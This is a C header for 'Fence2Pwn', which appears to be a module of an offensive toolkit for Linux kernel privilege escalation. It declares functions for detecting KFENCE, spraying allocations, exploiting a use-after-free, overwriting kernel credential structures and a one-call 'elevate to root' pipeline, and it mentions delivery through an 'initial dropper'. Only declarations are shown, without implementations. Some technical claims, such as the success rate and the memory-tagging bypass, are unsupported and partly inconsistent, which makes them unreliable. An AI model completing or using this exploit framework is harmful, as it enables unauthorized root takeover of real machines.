#ifndef JOCKY_FENCE2PWN_H
#define JOCKY_FENCE2PWN_H

#include <stdint.h>
#include <sys/types.h>

/* Fence2Pwn: KFENCE-Based Linux Privilege Escalation
 *
 * Exploits KFENCE's alternate memory allocation path to bypass slab
 * hardening, heap segregation, and memory tagging. KFENCE allocations
 * come from KFENCE-managed caches rather than size/type-segregated
 * slab caches, enabling cross-cache object reuse and credential
 * object manipulation.
 *
 * Technique: CVE-2026 class kernel exploitation
 * Platform: Linux (kernel 5.7+)
 * Effort: 3 days
 *
 * Success rate: ~90% overlap when allocating 4 cred objects during
 * reclamation on controlled systems.
 *
 * Requirements:
 * - Unprivileged code execution (e.g., via initial dropper)
 * - UAF (Use-After-Free) vulnerability in target kernel
 * - KFENCE enabled (default on most distributions)
 */

/* KFENCE memory pool parameters */
#define KFENCE_OBJECT_SIZE_MAX 0x4000  /* 16KB */

typedef struct {
    uint64_t start;
    uint64_t end;
    size_t object_count;
} KFENCE_POOL_INFO;

typedef struct {
    pid_t original_uid;
    pid_t original_gid;
    uid_t target_uid;
    gid_t target_gid;
} PRIVILEGE_CONTEXT;

/* Detect if KFENCE is enabled in the kernel */
int jocky_fence2pwn_detect_kfence(void);

/* Get KFENCE pool information from kernel (if readable) */
int jocky_fence2pwn_get_pool_info(KFENCE_POOL_INFO* out_info);

/* Trigger memory allocations to occupy KFENCE memory */
int jocky_fence2pwn_trigger_allocations(size_t alloc_size, int alloc_count);

/* Exploit UAF to manipulate kernel objects (cred, etc.) */
int jocky_fence2pwn_exploit_uaf(
    void* uaf_address,
    const uint8_t* payload,
    size_t payload_size);

/* Manipulate cred objects in KFENCE memory for privilege escalation */
int jocky_fence2pwn_manipulate_creds(
    PRIVILEGE_CONTEXT* priv_ctx,
    uid_t target_uid);

/* Allocate 4 cred objects in KFENCE to overlap with target object */
int jocky_fence2pwn_allocate_cred_objects(
    void** out_cred_ptrs,
    int cred_count);

/* Write modified cred structure to KFENCE memory */
int jocky_fence2pwn_write_cred(void* cred_addr, uid_t uid, gid_t gid);

/* Trigger reclamation phase to enable overlap */
int jocky_fence2pwn_trigger_reclamation(void);

/* Full pipeline: detect KFENCE, allocate objects, achieve LPE */
uid_t jocky_fence2pwn_elevate_to_root(void);

/* Utility: Find UAF vulnerability in kernel (requires analysis) */
int jocky_fence2pwn_find_uaf_primitive(
    void** out_uaf_address,
    size_t* out_object_size);

#endif /* JOCKY_FENCE2PWN_H */
